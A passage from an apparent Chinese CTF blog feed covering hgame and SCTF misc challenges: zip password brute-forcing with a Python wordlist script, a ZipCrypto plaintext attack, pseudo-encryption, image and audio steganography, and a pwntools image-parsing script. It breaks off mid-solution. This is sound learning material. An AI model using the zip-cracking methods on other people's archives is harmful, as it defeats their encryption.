&lt;p&gt;之后又尝试写了一个脚本，运行也可以得到密码：&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; zipfile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zip_file = zipfile.ZipFile(&lt;span class=&#34;string&#34;&gt;&amp;#x27;flag.zip&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zip_list = zip_file.namelist()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f=&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;password-note.txt&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lines = f.readlines()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; password &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; lines:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        zip_file.extractall(path=&lt;span class=&#34;string&#34;&gt;&amp;#x27;Test&amp;#x27;&lt;/span&gt;, pwd=password[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;].encode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;the password is &amp;#123;&amp;#125;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(password[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;#print(&amp;quot;the password is &amp;#123;&amp;#125;&amp;quot;.format(password[:-1]))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;明文攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#明文攻击&#34;&gt;#&lt;/a&gt; 明文攻击&lt;/h4&gt;
&lt;p&gt;解压后又得到了一个 flag.zip 和 README.txt... (/▽＼)&lt;br /&gt;
 flag.zip 中的内容一样被加密，其中包含 flag.jpg 和 README.txt&lt;br /&gt;
 仔细观察发现，两个 README.txt 的大小都是 68KB，所以考虑可能是明文攻击&lt;/p&gt;
&lt;p&gt;再看一下 README.txt，有提示&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you don&#39;t like to spend time compressing files, just stores them.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;联系 flag.zip 的加密算法：ZipCrypto Store，已经基本可以确定是明文了，&lt;/p&gt;
&lt;p&gt;把给的 README.txt 用 Zip 的存储方式加密，打开对比两个 README.txt 的 CRC 值，&lt;br /&gt;
均为 966AC0E8&lt;/p&gt;
&lt;p&gt;再次使用 ARCHPR，选择明文攻击，&lt;br /&gt;
等待 1~2 分钟左右点击停止即可，不用等它执行完&lt;/p&gt;
&lt;h4 id=&#34;伪加密&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪加密&#34;&gt;#&lt;/a&gt; 伪加密&lt;/h4&gt;
&lt;p&gt;明文攻击后得到了去除密码的一个 zip，&lt;br /&gt;
解压得到 flag.jpg 如下：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437720/Typera/2023/04/11a450d036a1c818089a7374c1f615a3.jpg&#34; alt=&#34;hgameM10&#34; /&gt;&lt;br /&gt;
 实际上从 7z 里面是能直接再点开这个 flag.jpg 的，可以看到里面还有一个 flag.jpg (￣_,￣)&lt;br /&gt;
 显然这个 flag.jpg 后面还藏了一个压缩包，使用 binwalk 分离，得到 4FC5.zip&lt;/p&gt;
&lt;p&gt;虽然有点奇怪，这里 7z 为啥不能直接打开这个新的压缩包，但尝试之后发现这个确实是伪加密&lt;br /&gt;
直接更改下图选中内容为 00 即可&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437699/Typera/2023/04/63704e239d39fc6a92fc0cb525370a7b.png&#34; alt=&#34;image-20230425234814596&#34; /&gt;&lt;/p&gt;
&lt;p&gt;终于得到了 flag：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437761/Typera/2023/04/53c11a8e13bbe5c3adfdef057ed8493c.png&#34; alt=&#34;image-20230425234917756&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;好康的流量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#好康的流量&#34;&gt;#&lt;/a&gt; 好康的流量&lt;/h3&gt;
&lt;p&gt;Wireshark 打开，右键 -&amp;gt; 追踪流 -&amp;gt;TCP 流，得到 base64 格式的图片文件：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437776/Typera/2023/04/c529efa42a73e54e0034029e844f57ca.png&#34; alt=&#34;image-20230425234931156&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudG9vbG5iLmNvbS90b29scy9iYXNlNjRUb0ltYWdlcy5odG1s&#34;&gt;在线 base64 转换图片&lt;/span&gt;得到：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437788/Typera/2023/04/7299c09dac948f983d1c5126055c377d.png&#34; alt=&#34;image-20230425234943176&#34; /&gt;&lt;/p&gt;
&lt;p&gt;stegsolve 打开，G2 得到一个条形码：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437796/Typera/2023/04/473ee4ccb1baae2f6d8baebff4eb969b.png&#34; alt=&#34;image-20230425234952577&#34; /&gt;&lt;br /&gt;
 保存后，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kZW1vLmR5bmFtc29mdC5jb20vYmFyY29kZS1yZWFkZXIv&#34;&gt;在线扫描图片&lt;/span&gt;得到前半段 flag  &lt;code&gt;hgame&amp;#123;ez_1mg_&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后在 Analyse-&amp;gt;Data Extract 里面，&lt;br /&gt;
按下图所示操作，可以得到后半 flag  &lt;code&gt;Steg4n0graphy&amp;#125;&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437806/Typera/2023/04/c026469fb7ab3fceba720421bc3cea72.png&#34; alt=&#34;image-20230425235001793&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;群青其实是幽灵东京&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#群青其实是幽灵东京&#34;&gt;#&lt;/a&gt; 群青 (其实是幽灵东京）&lt;/h3&gt;
&lt;p&gt;拿到.wav 文件，发现属性里藏了提示：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437816/Typera/2023/04/61191b2c8ce2754adbb5f4270499d7fc.png&#34; alt=&#34;image-20230425235012882&#34; /&gt;&lt;br /&gt;
 提示使用用 SilentEye，&lt;br /&gt;
直接 Decode 显示不正确，所以猜测要使用密码&lt;/p&gt;
&lt;p&gt;Audacity 打开，查看频谱图发现：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437826/Typera/2023/04/9b37356f52ea60ba659337e1615d5527.png&#34; alt=&#34;image-20230425235021424&#34; /&gt;&lt;br /&gt;
 猜测大概就是 key 了：Yoasobi&lt;br /&gt;
 解密得到一串网址，貌似是一个音频文件的地址&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437834/Typera/2023/04/097e85d689cebdbc315a2e1d74bf20c1.png&#34; alt=&#34;image-20230425235030317&#34; /&gt;&lt;br /&gt;
 访问下载得音频文件 S_S_T_V.wav&lt;/p&gt;
&lt;p&gt;搜索 SSTV，得知：SSTV（Slow-scan television）是一种图像传输方法，主要由业余无线电操作员使用，通过单色或彩色无线电发送和接收静态图像。&lt;/p&gt;
&lt;p&gt;原本想使用 RX-SSTV 解码器，但是貌似我的电脑上还需要安装一个叫 Virtual Audio Cable 的虚拟声卡，实在是太麻烦了 (╯□╰)&lt;br /&gt;
 所以我就干脆在手机上下载了 Robot36，用电脑播放音频，手机接听，最后得到这样一张图&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682437848/Typera/2023/04/267cd6c07e0bbbdcb3b0b57595089963.png&#34; alt=&#34;image-20230425235041961&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后扫码得到 flag： &lt;code&gt;hgame&amp;#123;1_c4n_5ee_the_wav&amp;#125;&lt;/code&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://www.sycamore.top/CyberSecurity/CTF/SCTF%E5%A4%8D%E7%8E%B0/</guid>
            <title>SCTF复现</title>
            <link>https://www.sycamore.top/CyberSecurity/CTF/SCTF%E5%A4%8D%E7%8E%B0/</link>
            <category>Python</category>
            <category>CTF</category>
            <category>Misc</category>
            <category>Pwn</category>
            <pubDate>Sun, 30 Jan 2022 03:18:22 +1100</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;misc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; MISC&lt;/h2&gt;
&lt;h3 id=&#34;fumo_xor_cli116&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fumo_xor_cli116&#34;&gt;#&lt;/a&gt; fumo_xor_cli（1.16）&lt;/h3&gt;
&lt;p&gt;啊啊啊，做这道题的时候就差一点，两张需要 xor 的图也导出来了，就是第一张那个需要叠加的图貌似排反了 ┭┮﹏┭┮&lt;br /&gt;
&lt;s&gt;（做的时候就发现两张图长度都是一样的，难怪我说 xor 出来不太对劲。。。）&lt;/s&gt;&lt;/p&gt;
&lt;h4 id=&#34;第一张图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一张图&#34;&gt;#&lt;/a&gt; 第一张图&lt;/h4&gt;
&lt;p&gt;nc 连上之后，发现出来了一堆彩色字符&lt;br /&gt;
 python PIL 转为图片，发现中间有两张图片部分有点奇怪&lt;br /&gt;
搜索了一下大概是 ANSI 转义字符，大致格式如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;\x1b[ 38 ; 2 ;  208 ; 243 ; 251 m9&lt;br /&gt;
38;2;&lt;em&gt;r&lt;/em&gt;;&lt;em&gt;g&lt;/em&gt;;&lt;em&gt;b&lt;/em&gt; Set text colour to an RGB value (e.g.  &lt;code&gt;\x1b[38;2;255;255;0m&lt;/code&gt; )&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由于 编程水平稀烂，总之写的转 png 的代码。。。一言难尽&lt;br /&gt;
 &lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; PIL &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;124.70.150.39&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img=[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;k=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(k&amp;lt;&lt;span class=&#34;number&#34;&gt;56&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	img.append(Image.new(&lt;span class=&#34;string&#34;&gt;&amp;quot;RGB&amp;quot;&lt;/span&gt;,(&lt;span class=&#34;number&#34;&gt;133&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x1b[&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	s=r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x1b[&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	j=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; j&amp;lt;&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; s==&lt;span class=&#34;string&#34;&gt;b&amp;#x27;A\x1b[&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				s=r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x1b[&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;comment&#34;&gt;#print(s)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				s=r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x1b[&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;comment&#34;&gt;#print(s)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; s:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;comment&#34;&gt;#print(s.split(b&amp;#x27;;&amp;#x27;)[2:])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				pixTuple=(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;((s.split(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;;&amp;#x27;&lt;/span&gt;)[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:])[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]),&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;((s.split(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;;&amp;#x27;&lt;/span&gt;)[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:])[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]),&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;((s.split(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;;&amp;#x27;&lt;/span&gt;)[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:])[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;][:-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				img[k].putpixel((i,j),pixTuple)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				i=i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		j=j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	img[k].save(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/1/%d.png&amp;#x27;&lt;/span&gt;%(k))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	k=k+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 所以我们得到了 56 张图片，emm... 中间有两张是，五彩斑斓的，肯定有问题，&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436722/Typera/2023/04/1fe97ece1c8993cbf990893b9dd0679d.png&#34; alt=&#34;SM1&#34; /&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436754/Typera/2023/04/eea64334d4a3ac700d91945121083752.png&#34; alt=&#34;SM2&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;第二张图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二张图&#34;&gt;#&lt;/a&gt; 第二张图&lt;/h4&gt;
&lt;p&gt;在 Lu1u 的提示下，原来这里面还有个网址，进入 (&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvRV9pREpCa1ZFQzRqWmFuenZxbldDQTA=&#34;&gt;https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA0&lt;/span&gt;)&lt;br /&gt;
 在最后找到了一张 fumo 的图片&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436784/Typera/2023/04/3ca22b531d34b89abc0f97bc0c306804.png&#34; alt=&#34;SM3&#34; /&gt;&lt;br /&gt;
 放大发现了一个间隔为 9 的点阵，因为感觉这些点的颜色和上面得到的那两张图挺像的，所以想到继续可以把这些点提出来合成一张图片&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; PIL &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img0=Image.new(&lt;span class=&#34;string&#34;&gt;&amp;#x27;RGB&amp;#x27;&lt;/span&gt;,(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;133&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img1=Image.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./fumo.png&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;w,h=img1.size&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ni=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;j=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nj=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; i&amp;lt;w:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	j=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	nj=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; j&amp;lt;h:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(j==&lt;span class=&#34;number&#34;&gt;1198&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		img0.putpixel((ni,nj),img1.getpixel((i,j)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		j=j+&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		nj=nj+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	i=i+&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ni=ni+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img0.show()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436814/Typera/2023/04/244e58d3d0b2a5daf7ee5837e5d8beb1.png&#34; alt=&#34;SM4&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;xor&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xor&#34;&gt;#&lt;/a&gt; XOR&lt;/h4&gt;
&lt;p&gt;前面得到的两张图均为 133x50，而第二张图 100x133，这不是巧了，&lt;br /&gt;
前两张张图加在一起，跟后面的那张长宽一样，再结合题目 fumo_xor_cli&lt;br /&gt;
emm... XOR 啊&lt;br /&gt;
思路就有了，&lt;s&gt;结果就拼图这一步，方向错了〒▽〒&lt;/s&gt;&lt;br /&gt;
先观察一下四个角的像素点，把那两张图旋转一下，拼在一起&lt;br /&gt;
